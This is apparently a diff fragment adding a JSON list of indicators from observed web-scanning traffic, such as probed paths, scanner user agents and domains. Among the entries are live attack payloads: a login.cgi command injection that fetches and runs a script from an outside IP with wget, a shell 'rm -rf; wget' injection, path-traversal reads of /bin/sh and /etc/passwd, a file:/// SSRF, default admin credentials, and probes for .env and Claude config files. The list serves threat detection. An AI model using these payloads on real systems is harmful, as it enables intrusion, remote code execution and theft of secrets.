+      "evidence_id": "/.env.bak",
+      "type": "URL",
+      "entity_value": "/.env.bak"
+    },
+    {
+      "evidence_id": "l9explore/1.2.2",
+      "type": "FINGERPRINT",
+      "entity_value": "l9explore/1.2.2"
+    },
+    {
+      "evidence_id": "/.env.development",
+      "type": "URL",
+      "entity_value": "/.env.development"
+    },
+    {
+      "evidence_id": "/153/list466.psp",
+      "type": "URL",
+      "entity_value": "/153/list466.psp"
+    },
+    {
+      "evidence_id": "seu.edu.cn",
+      "type": "DOMAIN",
+      "entity_value": "seu.edu.cn"
+    },
+    {
+      "evidence_id": "/.envrc.local",
+      "type": "URL",
+      "entity_value": "/.envrc.local"
+    },
+    {
+      "evidence_id": "/www/.env",
+      "type": "URL",
+      "entity_value": "/www/.env"
+    },
+    {
+      "evidence_id": "/boaform/admin/formLogin?username=admin&psd=admin",
+      "type": "URL",
+      "entity_value": "/boaform/admin/formLogin?username=admin&psd=admin"
+    },
+    {
+      "evidence_id": "admin",
+      "type": "CREDENTIAL",
+      "entity_value": "admin"
+    },
+    {
+      "evidence_id": "/html/.env",
+      "type": "URL",
+      "entity_value": "/html/.env"
+    },
+    {
+      "evidence_id": "/.env.stage",
+      "type": "URL",
+      "entity_value": "/.env.stage"
+    },
+    {
+      "evidence_id": "/.config",
+      "type": "URL",
+      "entity_value": "/.config"
+    },
+    {
+      "evidence_id": "/cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh",
+      "type": "URL",
+      "entity_value": "/cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh"
+    },
+    {
+      "evidence_id": "libredtail-http",
+      "type": "FINGERPRINT",
+      "entity_value": "libredtail-http"
+    },
+    {
+      "evidence_id": "/.env.example",
+      "type": "URL",
+      "entity_value": "/.env.example"
+    },
+    {
+      "evidence_id": "/.git/config",
+      "type": "URL",
+      "entity_value": "/.git/config"
+    },
+    {
+      "evidence_id": "/login.cgi?cli=aa%20aa%27;wget%20http://86.54.82.179/sh%20-O%20-%3E%20/tmp/kh;sh%20/tmp/kh%27$",
+      "type": "URL",
+      "entity_value": "/login.cgi?cli=aa%20aa%27;wget%20http://86.54.82.179/sh%20-O%20-%3E%20/tmp/kh;sh%20/tmp/kh%27$"
+    },
+    {
+      "evidence_id": "Hakai/2.0",
+      "type": "FINGERPRINT",
+      "entity_value": "Hakai/2.0"
+    },
+    {
+      "evidence_id": "/_profiler/phpinfo",
+      "type": "URL",
+      "entity_value": "/_profiler/phpinfo"
+    },
+    {
+      "evidence_id": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
+      "type": "FINGERPRINT",
+      "entity_value": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
+    },
+    {
+      "evidence_id": "/.env",
+      "type": "URL",
+      "entity_value": "/.env"
+    },
+    {
+      "evidence_id": "/s/lkx/_/;/META-INF/maven/com.atlassian.jira/jira-webapp-dist/pom.properties",
+      "type": "URL",
+      "entity_value": "/s/lkx/_/;/META-INF/maven/com.atlassian.jira/jira-webapp-dist/pom.properties"
+    },
+    {
+      "evidence_id": "pom.properties",
+      "type": "DOMAIN",
+      "entity_value": "pom.properties"
+    },
+    {
+      "evidence_id": "/.clauderc",
+      "type": "URL",
+      "entity_value": "/.clauderc"
+    },
+    {
+      "evidence_id": "/.env.backup",
+      "type": "URL",
+      "entity_value": "/.env.backup"
+    },
+    {
+      "evidence_id": "/api/geojson?url=file:///etc/hosts",
+      "type": "URL",
+      "entity_value": "/api/geojson?url=file:///etc/hosts"
+    },
+    {
+      "evidence_id": "/.env.old",
+      "type": "URL",
+      "entity_value": "/.env.old"
+    },
+    {
+      "evidence_id": "/.env.local",
+      "type": "URL",
+      "entity_value": "/.env.local"
+    },
+    {
+      "evidence_id": "/.env?import&raw??",
+      "type": "URL",
+      "entity_value": "/.env?import&raw??"
+    },
+    {
+      "evidence_id": "/docker-compose.override.yml",
+      "type": "URL",
+      "entity_value": "/docker-compose.override.yml"
+    },
+    {
+      "evidence_id": "/.env.production",
+      "type": "URL",
+      "entity_value": "/.env.production"
+    },
+    {
+      "evidence_id": "/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/hosts",
+      "type": "URL",
+      "entity_value": "/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/hosts"
+    },
+    {
+      "evidence_id": "Lkx-Apache2449TraversalPlugin/0.0.1 (+https://leakix.net/, +https://twitter.com/HaboubiAnis)",
+      "type": "FINGERPRINT",
+      "entity_value": "Lkx-Apache2449TraversalPlugin/0.0.1 (+https://leakix.net/, +https://twitter.com/HaboubiAnis)"
+    },
+    {
+      "evidence_id": "/.secret",
+      "type": "URL",
+      "entity_value": "/.secret"
+    },
+    {
+      "evidence_id": "/.vscode/sftp.json",
+      "type": "URL",
+      "entity_value": "/.vscode/sftp.json"
+    },
+    {
+      "evidence_id": "/phpinfo.php",
+      "type": "URL",
+      "entity_value": "/phpinfo.php"
+    },
+    {
+      "evidence_id": "/config.json",
+      "type": "URL",
+      "entity_value": "/config.json"
+    },
+    {
+      "evidence_id": "/docker-compose.yml",
+      "type": "URL",
+      "entity_value": "/docker-compose.yml"
+    },
+    {
+      "evidence_id": "/.env.save",
+      "type": "URL",
+      "entity_value": "/.env.save"
+    },
+    {
+      "evidence_id": "env.save",
+      "type": "DOMAIN",
+      "entity_value": "env.save"
+    },
+    {
+      "evidence_id": "/.claude/claude.json",
+      "type": "URL",
+      "entity_value": "/.claude/claude.json"
+    },
+    {
+      "evidence_id": "/.claude/settings.json",
+      "type": "URL",
+      "entity_value": "/.claude/settings.json"
+    },
+    {
+      "evidence_id": "/@fs/etc/passwd?import&raw??",
+      "type": "URL",
+      "entity_value": "/@fs/etc/passwd?import&raw??"
+    },
+    {
+      "evidence_id": "/server.py",
+      "type": "URL",
+      "entity_value": "/server.py"
+    },
+    {
+      "evidence_id": "/.json",
+      "type": "URL",
+      "entity_value": "/.json"
+    },
+    {
+      "evidence_id": "/.DS_Store",
+      "type": "URL",
+      "entity_value": "/.DS_Store"
+    },
+    {
+      "evidence_id": "Go-http-client/1.1",
+      "type": "FINGERPRINT",
+      "entity_value": "Go-http-client/1.1"
+    },
+    {
+      "evidence_id": "/admin.cgi",
+      "type": "URL",
+      "entity_value": "/admin.cgi"
+    },
+    {
+      "evidence_id": "Mozilla/5.0 (iPhone; CPU iPhone OS 18_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML",
+      "type": "FINGERPRINT",
+      "entity_value": "Mozilla/5.0 (iPhone; CPU iPhone OS 18_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML"
+    },
+    {
+      "evidence_id": "/admin.asp",
+      "type": "URL",
+      "entity_value": "/admin.asp"
+    },
+    {
+      "evidence_id": "/solr/admin/cores?action=STATUS&wt=json",
+      "type": "URL",
+      "entity_value": "/solr/admin/cores?action=STATUS&wt=json"
+    },
+    {
+      "evidence_id": "/admin.aspx",
+      "type": "URL",
+      "entity_value": "/admin.aspx"
+    },
+    {
+      "evidence_id": "/admin.cfm",
+      "type": "URL",
+      "entity_value": "/admin.cfm"
+    },
+    {
+      "evidence_id": "/shell?cd+/tmp;rm+-rf+*;wget+",
+      "type": "URL",
+      "entity_value": "/shell?cd+/tmp;rm+-rf+*;wget+"
+    },
+    {
+      "evidence_id": "Hello, world",
+      "type": "FINGERPRINT",
+      "entity_value": "Hello, world"
+    },
+    {
+      "evidence_id": "/metasys/com/jci/metasys/MetasysProperties.properties",
+      "type": "URL",
+      "entity_value": "/metasys/com/jci/metasys/MetasysProperties.properties"
+    },
+    {
+      "evidence_id": "MetasysProperties.properties",
+      "type": "DOMAIN",
+      "entity_value": "MetasysProperties.properties"
+    },
+    {
+      "evidence_id": "/admin.html",
+      "type": "URL",
+      "entity_value": "/admin.html"
+    },
+    {
+      "evidence_id": "/sms_mp/.sms_aut?mplist",
+      "type": "URL",
+      "entity_value": "/sms_mp/.sms_aut?mplist"
+    },
+    {
+      "evidence_id": "/admin.jsp",
+      "type": "URL",
+      "entity_value": "/admin.jsp"
+    },
+    {
+      "evidence_id": "/CFIDE/componentutils/",
+      "type": "URL",
+      "entity_value": "/CFIDE/componentutils/"
+    },
+    {
+      "evidence_id": "/admin.php",
+      "type": "URL",
+      "entity_value": "/admin.php"
+    },
+    {
+      "evidence_id": "/admin.shtml",
+      "type": "URL",
+      "entity_value": "/admin.shtml"
+    },
+    {
+      "evidence_id": "/admin/config.php",
+      "type": "URL",
+      "entity_value": "/admin/config.php"
+    },
+    {
+      "evidence_id": "/sdk",
+      "type": "URL",
+      "entity_value": "/sdk"
+    },
+    {
+      "evidence_id": "schemas.xmlsoap.org",
+      "type": "DOMAIN",
+      "entity_value": "schemas.xmlsoap.org"
+    },
+    {
+      "evidence_id": "w3.org",
+      "type": "DOMAIN",
+      "entity_value": "w3.org"
+    }
+  ]
+}
